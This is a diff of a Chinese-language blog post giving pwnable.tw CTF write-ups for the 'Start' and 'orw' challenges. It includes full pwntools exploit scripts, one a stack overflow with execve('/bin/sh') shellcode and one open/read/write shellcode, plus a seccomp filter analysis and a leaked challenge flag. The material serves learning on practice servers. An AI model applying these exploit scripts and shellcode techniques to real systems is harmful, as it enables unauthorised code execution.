@@ -24,8 +24,19 @@
 <meta property="og:image" content="https://i.imgur.com/eXVKNoL.png">
 <meta property="og:image" content="https://i.imgur.com/W54kMDY.png">
 <meta property="og:image" content="https://i.imgur.com/bMsp33H.png">
+<meta property="og:image" content="https://i.imgur.com/TuN7LIj.png">
+<meta property="og:image" content="https://i.imgur.com/8OpFJyX.png">
+<meta property="og:image" content="https://i.imgur.com/IbvpLGm.png">
+<meta property="og:image" content="https://i.imgur.com/Igd6ZrD.png">
+<meta property="og:image" content="https://i.imgur.com/ORggybV.png">
+<meta property="og:image" content="https://i.imgur.com/YM0VxYb.png">
+<meta property="og:image" content="https://i.imgur.com/fQUAflo.png">
+<meta property="og:image" content="https://i.imgur.com/Xxt2Qf8.png">
+<meta property="og:image" content="https://i.imgur.com/ORggybV.png">
+<meta property="og:image" content="https://i.imgur.com/1RCqDmU.png">
+<meta property="og:image" content="https://i.imgur.com/HHvSTPn.png">
 <meta property="article:published_time" content="2024-08-07T16:33:14.000Z">
-<meta property="article:modified_time" content="2024-08-08T12:55:40.890Z">
+<meta property="article:modified_time" content="2024-08-09T06:16:13.183Z">
 <meta property="article:author" content="skysoul1024">
 <meta property="article:tag" content="Pwn">
 <meta name="twitter:card" content="summary">
@@ -295,7 +306,7 @@
 
                 <!-- 文章字数统计 -->
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">812</span>Reading time: <span class="post-count reading-time">3 min</span></span>
+                        <span>Word count: <span class="post-count word-count">2.1k</span>Reading time: <span class="post-count reading-time">9 min</span></span>
                     </div>
                 <div class="post-intro-meta">
                     <!-- 撰写日期 -->
@@ -449,7 +460,7 @@
                 <main class="main post-page">
     <article class="article-entry">
         <p>包含 start、orw、CVE-2018-1160、calc、3x17</p>
-<p>這題需要查 <a target="_blank" rel="noopener" href="https://x86.syscall.sh/">syscall table</a></p>
+<p>好用的網站: <a target="_blank" rel="noopener" href="https://x86.syscall.sh/">syscall table</a>, <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/">linux kernel source code</a></p>
 <h1 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h1><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>先 nc 過去觀察行為，可以輸入東西。<br><img src="https://i.imgur.com/e4VHND4.png" alt="Imgur" style="display: block; margin-left: 0;"></p>
 <p>檢查防護，什麼都沒開，且知道是 <strong>x86 32bit</strong> 的程式。<br><img src="https://i.imgur.com/Dj28gPE.png" alt="Imgur" style="display: block; margin-left: 0;"></p>
 <p>看看 disassemble 的結果，這裡需要查表理解做了哪些 system call。</p>
@@ -475,33 +486,108 @@
 <h3 id="為什麼第一步重新執行一次-write-就可以取得-stack-address"><a href="#為什麼第一步重新執行一次-write-就可以取得-stack-address" class="headerlink" title="為什麼第一步重新執行一次 write 就可以取得 stack address?"></a>為什麼第一步重新執行一次 write 就可以取得 stack address?</h3><p>首先要知道每次執行程式，stack address 都會不一樣。</p>
 <p>回頭看 assembly，執行完 read 後，會執行 <code>.text:08048099                 add     esp, 20</code>，所以 esp 會到 return address 的位置<br><img src="https://i.imgur.com/b7P25px.png" alt="Imgur" style="display: block; margin-left: 0;"></p>
 <p>接著執行 ret，ret &#x3D; pop eip，因此 esp 執行完 ret 後變成 0xffefc4dc<br><img src="https://i.imgur.com/eXVKNoL.png" alt="Imgur" style="display: block; margin-left: 0;"></p>
-<ul>
-<li>write 的 ecx 是這樣寫的 <code>.text:08048087                 mov     ecx, esp</code></li>
-</ul>
-<p>因此再執行一次 write，就會印出 0xffefc4dc 的 value &#x3D; 0xffefc4e0</p>
-<!-- 需要一張 add esp 前、一張 add esp 後、一張第一次覆蓋後、一張第二次覆蓋後 -->
-
+<blockquote>
+<p>write 的 ecx 是這樣寫的 <code>.text:08048087                 mov     ecx, esp</code><br>因此再執行一次 write，就會印出 0xffefc4dc 的 value &#x3D; 0xffefc4e0</p>
+</blockquote>
 <h3 id="第二次-read-的-return-address-要填多少"><a href="#第二次-read-的-return-address-要填多少" class="headerlink" title="第二次 read 的 return address 要填多少?"></a>第二次 read 的 return address 要填多少?</h3><p>知道 stack address 後，這次可以將目標指到 shellcode 的位置了。</p>
 <p>上一步已知 esp &#x3D; 0xffefc4dc，從這接著寫下去。因為 read 後面 esp 會 + 20，所以 payload 要先塞 20 的 padding。<br>然後 stack 就會到 return address 的地方。shellcode 我會直接接著 return address 後寫下去，所以 return address 就是當前 esp + 20 + 4。</p>
-<ul>
-<li>因為 write 出來的 value 本身就會 + 4，所以寫 exploitation 時只要 + 20<img src="https://i.imgur.com/W54kMDY.png" alt="Imgur" style="display: block; margin-left: 0;"></li>
-</ul>
+<blockquote>
+<p>因為 write 出來的 value 本身就會 + 4，所以寫 exploitation 時只要 + 20</p>
+</blockquote>
+<img src="https://i.imgur.com/W54kMDY.png" alt="Imgur" style="display: block; margin-left: 0;">
+ 
 <p>這樣 ret 後就能成功指到 shellcode 的位置。<br><img src="https://i.imgur.com/bMsp33H.png" alt="Imgur" style="display: block; margin-left: 0;"></p>
 <h3 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h3><p>最後剩下 shellcode 要寫。</p>
 <p>這題不能直接用 <code>shellcraft.i386.linux.sh()</code>，可以試著去印看看 <code>shellcraft.i386.linux.sh()</code> 的長度，會發現要 44。而這題只有 36 能運用。</p>
 <p>所以需要自己寫 shellcode，或是網路上找別人寫的。</p>
+<ul>
+<li>如果想自己寫，目標就是按照 syscall table 將 <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> 填好。</li>
+</ul>
 <h3 id="Script"><a href="#Script" class="headerlink" title="Script"></a>Script</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">shellcode = &#x27;&#x27;&#x27;</span><br><span class="line">mov eax, 0xb</span><br><span class="line">push %s</span><br><span class="line">push %s</span><br><span class="line">mov ebx, esp</span><br><span class="line">xor ecx, ecx</span><br><span class="line">xor edx, edx</span><br><span class="line">int 0x80</span><br><span class="line">&#x27;&#x27;&#x27; % (u32(&#x27;/sh\x00&#x27;), u32(&#x27;/bin&#x27;))</span><br><span class="line"></span><br><span class="line">r = remote(&#x27;chall.pwnable.tw&#x27;, 10000)</span><br><span class="line"></span><br><span class="line">r.recvuntil(&#x27;:&#x27;)</span><br><span class="line">payload = b&#x27;A&#x27;*0x14 + p32(0x08048087)</span><br><span class="line">r.send(payload)</span><br><span class="line">addr = u32(r.recv()[:4])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b&#x27;A&#x27;*0x14 + p32(addr + 20) + asm(shellcode)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
 <!-- FLAG{Pwn4bl3_tW_1s_y0ur_st4rt} -->
 
-<h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1><h2 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h2><h1 id="施工中…"><a href="#施工中…" class="headerlink" title="施工中…"></a>施工中…</h1>
+<h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1><h2 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h2><p>nc 過去觀察行為，可以輸入東西，且直接要求 shellcode。<br><img src="https://i.imgur.com/TuN7LIj.png" alt="Imgur" style="display: block; margin-left: 0;"></p>
+<p>檢查防護，什麼都沒開，且知道是 <strong>x86 32bit</strong> 的程式。<br><img src="https://i.imgur.com/8OpFJyX.png" alt="Imgur" style="display: block; margin-left: 0;"></p>
+<p>是 x86 32 bit 的程式。<br><img src="https://i.imgur.com/IbvpLGm.png" alt="Imgur" style="display: block; margin-left: 0;"></p>
+<p>這題用 ida F5 反編譯還蠻好懂。<br><img src="https://i.imgur.com/Igd6ZrD.png" alt="Imgur" style="display: block; margin-left: 0;"></p>
+<blockquote>
+<p>執行 <code>orw_sccomp()</code> 後，印出訊息，讀使用者輸入，執行這段使用者輸入</p>
+</blockquote>
+<p>那來看看 <code>orw_sccomp()</code> 在做什麼。<br><img src="https://i.imgur.com/ORggybV.png" alt="Imgur" style="display: block; margin-left: 0;"></p>
+<blockquote>
+<p>去查 <code>prctl</code> 會發現，它屬於 linux system call</p>
+</blockquote>
+<p>去了解 <code>prctl</code> 的作用是什麼: <a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/prctl.2.html">prctl</a><br><img src="https://i.imgur.com/YM0VxYb.png" alt="Imgur" style="display: block; margin-left: 0;"></p>
+<blockquote>
+<p>根據描述，<code>prctl</code> 的第一個參數決定這個 syscall 要做什麼事情</p>
+</blockquote>
+<p>因此這題只要了解 <code>prctl</code> 的用途，限制哪些權限，就可以開始寫 shellcode。</p>
+<h2 id="prctl"><a href="#prctl" class="headerlink" title="prctl"></a>prctl</h2><p>接著查一下參數編號對應的是什麼，以下是我查詢的順序。</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.10.3/source/include/uapi/linux/prctl.h#L68">linux&#x2F;v6.10.3&#x2F;source&#x2F;include&#x2F;uapi&#x2F;linux&#x2F;prctl.h#L68</a></li>
+<li><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.10.3/source/kernel/sys.c#L2538">linux&#x2F;v6.10.3&#x2F;source&#x2F;kernel&#x2F;sys.c#L2538</a></li>
+<li><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.10.3/source/kernel/seccomp.c#L2084">linux&#x2F;v6.10.3&#x2F;source&#x2F;kernel&#x2F;seccomp.c#L2084</a></li>
+<li><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.10.3/source/include/uapi/linux/seccomp.h#L11">linux&#x2F;v6.10.3&#x2F;source&#x2F;include&#x2F;uapi&#x2F;linux&#x2F;seccomp.h#L11</a><!-- + [linux/v6.10.3/source/kernel/seccomp.c#L2046](https://elixir.bootlin.com/linux/v6.10.3/source/kernel/seccomp.c#L2046) -->
+<!-- + [linux/v6.10.3/source/kernel/seccomp.c#L1901](https://elixir.bootlin.com/linux/v6.10.3/source/kernel/seccomp.c#L1901) --></li>
+</ul>
+<p>從上面文件可以得知:</p>
+<ul>
+<li><code>prctl(38, 1, 0);</code><ul>
+<li>第一個參數 38 &#x3D; <code>PR_SET_NO_NEW_PRIVS</code></li>
+</ul>
+</li>
+<li><code>prctl(22, 2, (int)&amp;v1);</code><ul>
+<li>第一個參數 22 &#x3D; <code>PR_SET_SECCOMP</code></li>
+<li>第二個參數 2 &#x3D; <code>SECCOMP_MODE_FILTER</code></li>
+</ul>
+</li>
+</ul>
+<p>回頭看 man page:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/prctl.2.html">prctl</a></li>
+<li><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/PR_SET_SECCOMP.2const.html">PR_SET_SECCOMP</a></li>
+<li><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/seccomp.2.html">seccomp</a></li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/seccomp.2.html">seccomp</a> 內有兩段重點，其中一段:<br><img src="https://i.imgur.com/fQUAflo.png" alt="Imgur" style="display: block; margin-left: 0;"></p>
+<blockquote>
+<p>第三個參數是一個 struct sock_fprog 的 pointer，被設計來過濾任意的 syscall 和 syscall 參數，使用 BPF 定義的規則。</p>
+</blockquote>
+<p>另一段:<br><img src="https://i.imgur.com/Xxt2Qf8.png" alt="Imgur" style="display: block; margin-left: 0;"></p>
+<blockquote>
+<p>這裡指出 <code>prctl(38, 1, 0);</code> 的作用</p>
+</blockquote>
+<p>再去看 source code <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.10.3/source/include/uapi/linux/filter.h#L31">linux&#x2F;v6.10.3&#x2F;source&#x2F;include&#x2F;uapi&#x2F;linux&#x2F;filter.h#L31</a>，這裡定義了 sock_fprog 和 sock_filter。</p>
+<ul>
+<li>到這裡就可以理解 sock_filter &#x3D; BPF instruction</li>
+</ul>
+<p>那麼回去 ida 看看，sock_filter 怎麼寫的。</p>
+<p>v1, v2, v3 是寫在連續的記憶體內，他們應該就是 sock_fprog。<br><img src="https://i.imgur.com/ORggybV.png" alt="Imgur" style="display: block; margin-left: 0;"></p>
+<p>接下來就是一堆逆向細節，總之，建一個 struct 然後把 unk_8048640 的型別改成 sock_filter array。<br><img src="https://i.imgur.com/1RCqDmU.png" alt="Imgur" style="display: block; margin-left: 0;"></p>
+<p>然後! 規則好複雜我懶得看QQ，我餵給偉大的 GPT，以下廢話來自 GPT:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">1. &lt;20h, 0, 0, 4&gt;:</span><br><span class="line">+ 這條指令的 code 是 0x20，這代表 BPF_LD | BPF_ABS | BPF_W，即從絕對地址 k = 4 處讀取 4 字節數據。</span><br><span class="line"></span><br><span class="line">2.&lt;15h, 0, 9, 40000003h&gt;:</span><br><span class="line">+ 0x15 是 BPF_JMP | BPF_JEQ | BPF_K，這條指令將當前寄存器值與 k = 0x40000003 進行比較，如果相等，跳轉 0 行，否則跳轉 9 行。</span><br><span class="line"></span><br><span class="line">3. &lt;20h, 0, 0, 0&gt;:</span><br><span class="line">+ 與第一行類似，從地址 k = 0 處讀取 4 字節數據。</span><br><span class="line"></span><br><span class="line">4. &lt;15h, 7, 0, 0ADh&gt;:</span><br><span class="line">+ 將當前寄存器值與 k = 0xAD 進行比較，如果相等，跳轉 7 行，否則繼續執行。</span><br><span class="line"></span><br><span class="line">5. &lt;15h, 6, 0, 77h&gt;:</span><br><span class="line">+ 將當前寄存器值與 k = 0x77 進行比較，如果相等，跳轉 6 行，否則繼續執行。</span><br><span class="line"></span><br><span class="line">6. &lt;15h, 5, 0, 0FCh&gt;:</span><br><span class="line">+ 將當前寄存器值與 k = 0xFC 進行比較，如果相等，跳轉 5 行，否則繼續執行。</span><br><span class="line"></span><br><span class="line">7. &lt;15h, 4, 0, 1&gt;:</span><br><span class="line">+ 將當前寄存器值與 k = 1 進行比較，如果相等，跳轉 4 行，否則繼續執行。</span><br><span class="line"></span><br><span class="line">8. &lt;15h, 3, 0, 5&gt;:</span><br><span class="line">+ 將當前寄存器值與 k = 5 進行比較，如果相等，跳轉 3 行，否則繼續執行。</span><br><span class="line"></span><br><span class="line">9. &lt;15h, 2, 0, 3&gt;:</span><br><span class="line">+ 將當前寄存器值與 k = 3 進行比較，如果相等，跳轉 2 行，否則繼續執行。</span><br><span class="line"></span><br><span class="line">10. &lt;15h, 1, 0, 4&gt;:</span><br><span class="line">+ 將當前寄存器值與 k = 4 進行比較，如果相等，跳轉 1 行，否則繼續執行。</span><br><span class="line"></span><br><span class="line">11. &lt;6, 0, 0, 50026h&gt;:</span><br><span class="line">+ 0x06 是 BPF_RET | BPF_K，這行指令返回 0x50026（允許的系統調用）。</span><br><span class="line"></span><br><span class="line">12. &lt;6, 0, 0, 7FFF0000h&gt;:</span><br><span class="line">這行指令返回 0x7FFF0000（拒絕的系統調用）。</span><br><span class="line"></span><br><span class="line">根據這段過濾器的設置，以下系統調用號碼將被允許執行：</span><br><span class="line"></span><br><span class="line">0x40000003（這應該是一個非標準的號碼，可能是在特定的架構或內核版本中使用）</span><br><span class="line">0xAD (173)</span><br><span class="line">0x77 (119)</span><br><span class="line">0xFC (252)</span><br><span class="line">0x01 (1) — sys_exit</span><br><span class="line">0x05 (5) — sys_open</span><br><span class="line">0x03 (3) — sys_read</span><br><span class="line">0x04 (4) — sys_write</span><br><span class="line"></span><br><span class="line">所有其他系統調用都將被拒絕。</span><br></pre></td></tr></table></figure>
+<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>前面費了這麼多功夫，後來發現了一個超強工具 – <a target="_blank" rel="noopener" href="https://github.com/david942j/seccomp-tools">seccomp-tools</a>。</p>
+<ul>
+<li>用這個工具要先裝 RubyGems</li>
+</ul>
+<p>一行指令就知道 seccomp 限制哪些權限QQ。<br><img src="https://i.imgur.com/HHvSTPn.png" alt="Imgur" style="display: block; margin-left: 0;"></p>
+<p>結果跟前面 GPT 的回答一樣。</p>
+<h2 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h2><p>完整了解題目後，我們知道有 open、read、write 可以用，有這三個 system call 就能取得 flag。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd = open(&quot;/home/orw/flag&quot;)</span><br><span class="line">read(fd, buf, len)</span><br><span class="line">write(stdout, buf, len)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Script-1"><a href="#Script-1" class="headerlink" title="Script"></a>Script</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.arch = &#x27;i386&#x27;</span><br><span class="line">context.os = &#x27;linux&#x27;</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.i386.open(&#x27;/home/orw/flag&#x27;)</span><br><span class="line">shellcode += shellcraft.i386.read(&#x27;eax&#x27;, &#x27;esp&#x27;, 50)</span><br><span class="line">shellcode += shellcraft.i386.write(1, &#x27;esp&#x27;, 50)</span><br><span class="line"></span><br><span class="line">r = remote(&#x27;chall.pwnable.tw&#x27;, 10001)</span><br><span class="line"></span><br><span class="line">r.recvuntil(b&#x27;:&#x27;)</span><br><span class="line">r.sendline(asm(shellcode))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="小結"><a href="#小結" class="headerlink" title="小結"></a>小結</h2><p>雖然說這題從題目就能猜到要怎麼解，但好奇原理所以試著更深入了解。</p>
+<p>這整個過程是我第一次查 source code 查文件來學習技術，但後來發現這些東西都有工具可以幫忙完成。</p>
+<p>好處是自己對 seccomp 的原理有更深的了解，且學到一個經驗，如果這是正式比賽，應該先去查有沒有工具能夠直接取得想要的資訊。</p>
+<h1 id="施工中…"><a href="#施工中…" class="headerlink" title="施工中…"></a>施工中…</h1>
     </article>
     <!-- license -->
         <div class="license-wrapper">
             <p>Author：<a href="https://skysoul1024.github.io">skysoul1024</a>
             <p>Link：<a href="https://skysoul1024.github.io/2024/08/08/pwnable-tw-write-up-1/">https://skysoul1024.github.io/2024/08/08/pwnable-tw-write-up-1/</a>
             <p>Publish date：<a href="https://skysoul1024.github.io/2024/08/08/pwnable-tw-write-up-1/">August 8th 2024, 12:33:14 am</a>
-            <p>Update date：<a href="https://skysoul1024.github.io/2024/08/08/pwnable-tw-write-up-1/">August 8th 2024, 8:55:40 pm</a>
+            <p>Update date：<a href="https://skysoul1024.github.io/2024/08/08/pwnable-tw-write-up-1/">August 9th 2024, 2:16:13 pm</a>
             <p>License：<a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"></a>This article is licensed under<a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0</a></p>
         </div>
     <!-- paginator -->
@@ -566,7 +652,7 @@
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Start"><span class="toc-number">1.</span> <span class="toc-text">Start</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stack-Frame"><span class="toc-number">1.2.</span> <span class="toc-text">Stack Frame</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">1.3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%82%BA%E4%BB%80%E9%BA%BC%E7%AC%AC%E4%B8%80%E6%AD%A5%E9%87%8D%E6%96%B0%E5%9F%B7%E8%A1%8C%E4%B8%80%E6%AC%A1-write-%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%8F%96%E5%BE%97-stack-address"><span class="toc-number">1.3.1.</span> <span class="toc-text">為什麼第一步重新執行一次 write 就可以取得 stack address?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1-read-%E7%9A%84-return-address-%E8%A6%81%E5%A1%AB%E5%A4%9A%E5%B0%91"><span class="toc-number">1.3.2.</span> <span class="toc-text">第二次 read 的 return address 要填多少?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shellcode"><span class="toc-number">1.3.3.</span> <span class="toc-text">Shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Script"><span class="toc-number">1.3.4.</span> <span class="toc-text">Script</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#orw"><span class="toc-number">2.</span> <span class="toc-text">orw</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%BD%E5%B7%A5%E4%B8%AD%E2%80%A6"><span class="toc-number">3.</span> <span class="toc-text">施工中…</span></a></li></ol>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Start"><span class="toc-number">1.</span> <span class="toc-text">Start</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stack-Frame"><span class="toc-number">1.2.</span> <span class="toc-text">Stack Frame</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">1.3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%82%BA%E4%BB%80%E9%BA%BC%E7%AC%AC%E4%B8%80%E6%AD%A5%E9%87%8D%E6%96%B0%E5%9F%B7%E8%A1%8C%E4%B8%80%E6%AC%A1-write-%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%8F%96%E5%BE%97-stack-address"><span class="toc-number">1.3.1.</span> <span class="toc-text">為什麼第一步重新執行一次 write 就可以取得 stack address?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1-read-%E7%9A%84-return-address-%E8%A6%81%E5%A1%AB%E5%A4%9A%E5%B0%91"><span class="toc-number">1.3.2.</span> <span class="toc-text">第二次 read 的 return address 要填多少?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shellcode"><span class="toc-number">1.3.3.</span> <span class="toc-text">Shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Script"><span class="toc-number">1.3.4.</span> <span class="toc-text">Script</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#orw"><span class="toc-number">2.</span> <span class="toc-text">orw</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#prctl"><span class="toc-number">2.2.</span> <span class="toc-text">prctl</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">2.2.1.</span> <span class="toc-text">工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-1"><span class="toc-number">2.3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Script-1"><span class="toc-number">2.3.1.</span> <span class="toc-text">Script</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%B5%90"><span class="toc-number">2.4.</span> <span class="toc-text">小結</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%BD%E5%B7%A5%E4%B8%AD%E2%80%A6"><span class="toc-number">3.</span> <span class="toc-text">施工中…</span></a></li></ol>
             </div>
         <!-- sidebar -->
         <div class="sidebar sidebar-hide">
